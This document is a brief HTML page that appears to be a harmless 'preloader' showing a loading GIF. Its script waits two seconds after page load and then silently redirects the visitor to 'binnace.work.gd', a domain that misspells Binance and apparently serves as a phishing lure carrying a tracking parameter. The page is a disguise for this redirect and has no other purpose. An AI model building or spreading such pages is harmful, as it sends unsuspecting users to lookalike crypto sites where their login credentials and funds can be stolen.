<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>My Page with Preloader</title>
  <style>
    #preloader {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #fefcfe;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #preloader img {
      width: 48px;
    }

    @media (min-width: 768px) {
      #preloader img {
        width: 55px;
      }
    }
  </style>
</head>

<body>
  <div id="preloader">
    <img src="Loading.gif" alt="Loading..." />
  </div>


  <script>
    window.addEventListener("load", function () {
      setTimeout(function () {
        window.location.href = "https://binnace.work.gd/?i=2gt7rp";
      }, 2000);
    });
  </script>
</body>

</html>
